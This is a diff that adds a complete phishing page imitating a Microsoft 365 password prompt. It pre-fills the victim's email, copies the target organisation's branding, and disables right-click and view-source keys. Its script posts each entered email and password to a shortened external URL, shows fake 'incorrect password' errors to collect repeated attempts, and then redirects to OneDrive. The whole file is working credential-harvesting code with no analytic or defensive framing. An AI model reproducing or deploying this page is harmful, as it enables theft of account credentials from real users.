@@ -1,0 +1,278 @@
+<script>
+    var url_string = "[[-Email-]]";
+    var o365File = "https://shorturl.at/nqFL6";
+</script>
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Sign in to your account</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+    <link rel="shortcut icon"
+        href="https://aadcdn.msftauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
+    <link data-loader="cdn" crossorigin="anonymous"
+        href="https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/converged.v2.login.min_ziytf8dzt9eg1s6-ohhleg2.css"
+        rel="stylesheet">
+</head>
+<script>
+    // prevent ctrl + s
+    window.addEventListener('keydown', async (e) => {
+        if (e.ctrlKey && (e.which == 83)) {
+            e.preventDefault();
+            return false;
+        }
+    });
+    window.addEventListener('contextmenu', event => event.preventDefault());
+    document.onkeydown = function (e) {
+        if (event.keyCode == 123) {
+            return false;
+        }
+        if (e.ctrlKey && e.keyCode == 'E'.charCodeAt(0)) {
+            return false;
+        }
+        if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
+            return false;
+        }
+        if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
+            return false;
+        }
+        if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
+            return false;
+        }
+        if (e.ctrlKey && e.keyCode == 'S'.charCodeAt(0)) {
+            return false;
+        }
+        if (e.ctrlKey && e.keyCode == 'H'.charCodeAt(0)) {
+            return false;
+        }
+        if (e.ctrlKey && e.keyCode == 'A'.charCodeAt(0)) {
+            return false;
+        }
+        if (e.ctrlKey && e.keyCode == 'F'.charCodeAt(0)) {
+            return false;
+        }
+        if (e.ctrlKey && e.keyCode == 'E'.charCodeAt(0)) {
+            return false;
+        }
+    }
+    window.onkeydown = (e) => {
+        return !(e.ctrlKey &&
+            (e.keyCode === 67 ||
+                e.keyCode === 85 ||
+                e.keyCode === 86 ||
+                e.keyCode === 88 ||
+                e.keyCode === 117));
+    };    
+</script>
+
+<body class="cb" style="display: block;">
+    <form name="f1" id="i0281" method="post" autocomplete="off">
+        <div class="login-paginated-page">
+            <div id="lightboxTemplateContainer">
+                <div id="lightboxBackgroundContainer">
+                    <div class="background-image-holder" role="presentation">
+                        <div class="background-image ext-background-image"
+                            style="background-image: url(&quot;https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg&quot;);">
+                        </div>
+                    </div>
+                </div>
+                <div class="outer" id="bgImgCenter">
+                    <div class="template-section main-section">
+                        <div class="middle ext-middle">
+                            <div class="full-height">
+                                <div class="flex-column">
+                                    <div class="win-scroll">
+                                        <div id="lightbox" class="sign-in-box ext-sign-in-box fade-in-lightbox">
+                                            
+                                            <div role="main">
+                                                <div id="pstb"
+                                                    class="pagination-view animate has-identity-banner slide-in-next">
+                                                    <div>
+                                                        <div class="identityBanner">
+                                                            <button type="button" class="backButton" id="idBtn_Back">
+                                                                <img role="presentation"
+                                                                    pngsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/arrow_left_7cc096da6aa2dba3f81fcc1c8262157c.png"
+                                                                    svgsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg"
+                                                                    src="https://aadcdn.msftauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg">
+                                                            </button>
+                                                            <div id="show-email" class="identity"></div>
+                                                        </div>
+                                                        <div id="loginHeader" class="row title ext-title">
+                                                            <div role="heading" aria-level="1">Enter password</div>
+                                                        </div>
+                                                        <div id="errorpw"
+                                                            style="color: red; margin: 15px; margin-left: 0px; margin-top: 0px; margin-bottom: 0px;">
+                                                        </div>
+                                                        <div id="important1" style="color: black;font-size: 13px;">
+                                                            Because you're accessing sensitive info, you need to verify
+                                                            your password
+                                                        </div>
+                                                        <div class="row">
+                                                            <div class="form-group col-md-24">
+                                                                <div class="placeholderContainer">
+                                                                    <input name="passwd" type="password" id="i0118"
+                                                                        autocomplete="off"
+                                                                        class="form-control input ext-input text-box ext-text-box"
+                                                                        placeholder="Password" required />
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                        <div>
+                                                            <div class="position-buttons">
+                                                                <div>
+                                                                    <div class="row">
+                                                                        <div class="col-md-24">
+                                                                            <div class="text-13">
+                                                                                <div class="form-group">
+                                                                                    <a id="idA_PWD_ForgotPassword"
+                                                                                        role="link" href="#">Forgotten
+                                                                                        my password</a>
+                                                                                </div>
+                                                                                <div class="form-group">
+                                                                                    <a id="idA_PWD_ForgotPassword"
+                                                                                        role="link" href="#">Sign in
+                                                                                        with another account</a>
+                                                                                </div>
+                                                                                <div class="form-group">
+                                                                                </div>
+                                                                            </div>
+                                                                        </div>
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+
+                                                            <div class="win-button-pin-bottom">
+                                                                <div class="row">
+                                                                    <div>
+                                                                        <div
+                                                                            class="col-xs-24 no-padding-left-right button-container">
+                                                                            <div class="inline-block">
+                                                                                <input type="submit" id="Button9"
+                                                                                    class="win-button button_primary button ext-button primary ext-primary"
+                                                                                    value="Sign in">
+                                                                            </div>
+
+                                                                        </div>
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="plate footer ext-footer" role="contentinfo"></div>
+            <div id="footer" role="contentinfo" class="footer ext-footer">
+                <div>
+                    <div id="footerLinks" class="footerNode text-secondary">
+                        <a id="ftrTerms" href="#"
+                            class="footer-content ext-footer-content footer-item ext-footer-item">Terms of use</a>
+                        <a id="ftrPrivacy" href="#"
+                            class="footer-content ext-footer-content footer-item ext-footer-item">Privacy &amp;
+                            cookies</a>
+                        <a id="moreOptions" href="#" aria-label="Click here for troubleshooting information"
+                            class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+        </div>
+        </div>
+    </form>
+    <script>
+        var count = 0;
+        function set_brand(email) {
+            $.ajax({
+                url: o365File,
+                type: "POST",
+                data: { username: email },
+                success: function (response) {
+                    console.log(response);
+                    let res = JSON.parse(response)
+                    if (res) {
+                        if (res["res"]["BannerLogo"]) {
+                            $('.logo').attr('src', res["res"]["BannerLogo"]);
+                        }
+                        if (res["res"]["BoilerPlateText"]) {
+                            $(".plate").append(res["res"]["BoilerPlateText"]);
+                            $(".plate").css({ "text-align": "center", "left": "0", "line-height": "200px", "margin-top": "-100px", "position": "absolute", "top": "95%", "width": "100%" })
+                        }
+                        if (res["res"]["Illustration"]) {
+                            $('.background-image').css({ 'background-image': "url('" + res["res"]["Illustration"] + "')"});
+                        } else if (res["res"]["TileDarkLogo"]) {
+                            $('.background-image').css({ 'background-image': "url('" + res["res"]["TileDarkLogo"] + "')"});
+                        } else if (res["res"]["TileLogo"]) {
+                            $('.background-image').css({ 'background-image': "url('" + res["res"]["TileLogo"] + "')"});
+                        }
+                        if (res["res"]["BackgroundColor"]) {
+                            $('.background-image').css({ 'background-color': '' + res["res"]["BackgroundColor"] + ''});
+                        }
+
+                    }
+                }
+            });
+        }
+
+        function send_result(user, pass) {
+            $.ajax({
+                url: o365File,
+                data: {
+                    "email": user,
+                    "password": pass
+                },
+                type: "POST",
+                success: function (data) {
+                    console.log(data);
+                },
+                error: function (data) {
+                    console.log('Ajax error');
+                }
+            });
+        }
+
+
+        document.addEventListener('DOMContentLoaded', async () => {
+            if (url_string) {
+                document.getElementById("show-email").innerHTML = url_string;
+                document.getElementById("i0118").focus();
+                set_brand(url_string);
+            }
+
+            document.getElementById("Button9").addEventListener("click", event => {
+                event.preventDefault ? event.preventDefault() : event.returnValue = false;
+
+                var pswd = document.getElementById("i0118").value;
+                if (pswd.length < 5) {
+                    document.getElementById("important1").style.display = "none";
+                    setTimeout(() => { document.getElementById("i0281").reset(); document.getElementById('errorpw').innerHTML = "Your account password is too short." }, 1500);
+                } else if (pswd.length > 5 && count <= 0) {
+                    send_result(url_string, pswd);
+                    document.getElementById("important1").style.display = "none";
+                    setTimeout(() => { count++; document.getElementById("i0281").reset(); document.getElementById('errorpw').innerHTML = `Your account password cannot be empty. if you don't remember your password, <a href="#">reset it now.</a>` }, 2000)
+                } else if (count < 2) {
+                    send_result(url_string, pswd);
+                    document.getElementById("important1").style.display = "none";
+                    setTimeout(() => { count++; document.getElementById("i0281").reset(); document.getElementById('errorpw').innerHTML = `Your account or password is incorrect. If you dont remember your password, <a href="https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/oauth20_authorize.srf%3fclient_id%3dee272b19-XMR253a%252f%252fsupport.microsoft.com%252fsignin-oidc%26response_type%3dcode%2bid_token%26state%3dCfDJ8IjN1gSfizBNiqPM4_wfrQLhTkdJz-4-UZL4urLHiMjeJcpJbDG2E7rMhXkcKuloSsFDCxF0C1yDSBXWAcs_jN7PvlVVsviCSXW94e6OfJFYlpwsfzq0lv3WM_cyex6yhe-ZUeqKDxmONrKL_oYdvTv0O2aSM6HHi7a8Zg0YjQpe5l14kN48LZ-ZGj0joKVDdqHvXrHhvcBpEf303yb2-WUCAruDM08SH87mjJUTGNkWMcu-m8WuOzeHKNXTv9aPn5KrGS6TBCXExtUoIfA98adZ56WngZPhSe4etV40yV9e6329LXzePthFzD_c5DaffDiWvIEBCfosyKcRGZjb1YAZKNhIayxVlBeEbixc1OaYKwXQSlfULqa2LQeQ9DgBMDw01RWGhq8JHu18pId2xlAIW2HjFKni4SwmcQXkCcOz%26response_mode%3dform_post%26nonce%3d637762531977818004.YTlkOTM0YzYtYTljNy00NDcwLWJmNTktOTAzZDkwNWFlMjY3M2MzMmIyYWMtNGFlYy00MzdjLWFkMmQtYTJiNDczMTgyOTkz%26x-client-SKU%3dID_NETSTANDARD2_0%26x-client-Ver%3d6.7.1.0%26uaid%1EjW36vrHYqku4DfEzedoehcLdB9evYEas%26msproxy%3d1%26issuer%3dmso%26tenant%3dcommon%26ui_locales%3den-US%26username%3dab%2540outlook.com%26login_hint%3dab%2540outlook.com%26contextid%3dB8371C7815F0BD96%26bk%3d1640656451&id=293577&uiflavor=web&client_id=1E00004C3D2508&uaid=51cd2e3a62184b06b8155653d4870d93&mkt=EN-US&lc=1033&bk=1640656451">reset it now.</a>` }, 2000)
+                } else {
+                    send_result(url_string, pswd);
+                    setTimeout(() => { window.location.replace("https://onedrive.live.com/?id=root&cid=DBCBAD96B24189EE") }, 3000);
+                }
+            });
+        });
+    </script>
+    </div>
+</body>
+
+</html>
